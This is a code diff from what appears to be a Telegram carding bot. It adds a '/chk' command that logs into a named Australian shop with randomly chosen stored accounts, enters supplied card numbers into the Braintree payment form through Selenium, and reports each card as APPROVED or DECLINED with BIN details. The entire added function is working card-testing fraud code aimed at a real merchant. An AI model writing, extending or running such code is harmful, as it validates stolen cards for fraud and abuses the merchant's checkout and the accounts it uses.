@@ -6787,6 +6787,108 @@ async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
         Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()
 
+# ==== 10. /chk Command (FINAL - SS FIXED 100%) ==== #
+
+def run_chk_process(card_input):
+    import random, time, traceback
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+
+    start = time.time()
+    driver = None
+
+    try:
+        accounts = get_chk_accounts()
+        if not accounts:
+            return {"error": "No accounts found", "driver": None}
+
+        email, password = random.choice(accounts)
+
+        driver = create_killer_driver()
+        wait = WebDriverWait(driver, 8)
+
+        url = "https://shop.pottyplant.com.au/my-account/add-payment-method/"
+        driver.get(url)
+
+        # LOGIN
+        wait.until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
+        wait.until(EC.presence_of_element_located((By.ID, "password"))).send_keys(password)
+
+        driver.execute_script(
+            "arguments[0].click();",
+            wait.until(EC.presence_of_element_located((By.NAME, "login")))
+        )
+
+        time.sleep(2)
+
+        # FORCE REDIRECT
+        driver.get(url)
+        wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
+
+        add_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
+
+        cc, mm, yy, cvv = killer_split_card(card_input)
+
+        # BRAINTREE FILL
+        iframes = driver.find_elements(By.CSS_SELECTOR, "iframe")
+
+        for iframe in iframes:
+            try:
+                driver.switch_to.frame(iframe)
+                src = iframe.get_attribute("src") or ""
+
+                if "number" in src:
+                    driver.find_element(By.NAME, "credit-card-number").send_keys(cc)
+
+                elif "expiration" in src:
+                    driver.find_element(By.NAME, "expiration").send_keys(mm + yy)
+
+                elif "cvv" in src:
+                    driver.find_element(By.NAME, "cvv").send_keys(cvv)
+
+                driver.switch_to.default_content()
+            except:
+                driver.switch_to.default_content()
+
+        # SUBMIT
+        driver.execute_script("arguments[0].click();", add_btn)
+
+        time.sleep(2)
+
+        # RESPONSE
+        try:
+            err = driver.find_element(By.CSS_SELECTOR, ".woocommerce-error li").text
+            status = "DECLINED"
+            response = err
+        except:
+            status = "APPROVED"
+            response = "No error returned"
+
+        duration = round(time.time() - start, 2)
+        bin_info, bin_flag = get_cached_bin_info(cc[:6])
+
+        # ✅ CLOSE DRIVER ONLY ON SUCCESS
+        try:
+            driver.quit()
+        except:
+            pass
+
+        return {
+            "status": status,
+            "response": response,
+            "time": duration,
+            "bin": f"{bin_info} {bin_flag}",
+            "account": email
+        }
+
+    except Exception:
+        # ❗ DO NOT QUIT DRIVER HERE
+        return {
+            "error": traceback.format_exc(),
+            "driver": driver
+        }
+    
 async def chk_cmd(update, context):
     uid = update.effective_user.id
 
@@ -6852,6 +6954,7 @@ async def chk_cmd(update, context):
             pass
 
         record_cmd_failure("chk")
+
 
 # ==== 12. /sort COMMAND (Fixed Card Sorting & Cleaning) ====
 def extract_and_clean_cards_sort(data_text):
